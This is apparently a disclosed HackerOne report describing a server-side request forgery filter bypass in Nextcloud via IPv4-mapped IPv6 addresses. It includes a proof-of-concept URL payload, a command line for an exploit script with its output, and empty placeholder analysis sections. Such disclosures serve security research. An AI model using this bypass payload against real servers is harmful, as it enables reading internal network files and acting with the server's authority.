---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '736867'
original_report_id: '736867'
title: SSRF protection bypass
weakness: Server-Side Request Forgery (SSRF)
team_handle: nextcloud
created_at: '2019-11-13T14:07:57.214Z'
disclosed_at: '2020-03-14T10:10:57.211Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 17
asset_identifier: nextcloud/server
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- server-side-request-forgery-ssrf
---

# SSRF protection bypass

## Metadata

- HackerOne Report ID: 736867
- Weakness: Server-Side Request Forgery (SSRF)
- Program: nextcloud
- Disclosed At: 2020-03-14T10:10:57.211Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

CVSS
----

High 7.7 [CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N)


Description
-----------

The filter which protects Nextcloud from SSRF can be bypassed using IPv6/IPv4 address embedding.

SSRF protection is for example used in the calendar or dav apps. Successful exploitation of the issue will allow reading of files in the local network with the authorization of the server hosting Nextcloud.

POC
---

The following example can be used to bypass the SSRF filter, where `127.0.0.1` is the server hosting the file:

    http://[0:0:0:0:0:ffff:127.0.0.1]/thefile

The issue can for example be exploited in the calendar app with the attached exploit. Usage:

    python nextcloud_ssrf.py http://192.168.0.105/nextcloud/nextcloud/ admin "[password]" http://[0:0:0:0:0:ffff:127.0.0.1]:80/secret.ics
    BEGIN:VCALENDAR
    VERSION:2.0
    PRODID:-//hacksw/handcal//NONSGML v1.0//EN
    BEGIN:VEVENT
    UID:uid1@example.com
    DTSTAMP:19970714T170000Z
    ORGANIZER;CN=John Doex:MAILTO:john.doe@example.com
    DTSTART:19970714T170000Z
    DTEND:19970715T035959Z
    SUMMARY:Bastille Day Party
    GEO:48.85299;2.36885
    END:VEVENT
    END:VCALENDAR

## Impact

exfiltrate data from the internal network and perform actions in the name of the server in the internal network

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
